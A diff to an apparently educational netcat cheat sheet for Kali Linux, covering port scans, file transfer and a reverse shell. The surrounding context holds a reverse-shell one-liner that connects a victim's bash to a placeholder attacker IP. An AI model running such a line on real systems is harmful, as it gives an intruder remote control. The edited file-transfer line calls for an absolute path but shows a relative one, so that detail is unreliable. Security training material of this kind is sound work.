@@ -33,7 +33,7 @@ Recommended OS: Kali Linux
 - **Scan for certain ports in a range**: `nc -zv <hostname> 1-100` (z-scan without full connection)
 - **Send file**:  
   1. Receiver (opens port & prepares to save file):  `nc -lvp 4321 > received_file.txt`  
-  2. Sender (connects & sends file to receiver’s IP):  `nc <receiver_ip> 4321 < my_file.txt`
+  2. Sender (connects & sends file to receiver’s IP):  `nc <receiver_ip> 4321 < home/kali/my_file.txt` (must use absolute path)
 - **Reverse Shell**:  
   1. Sender/Attacker (listens for connection)::  `nc -lvp 4444`  
   2. Receiver/Victim (connects & gives interactive shell to attacker):  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
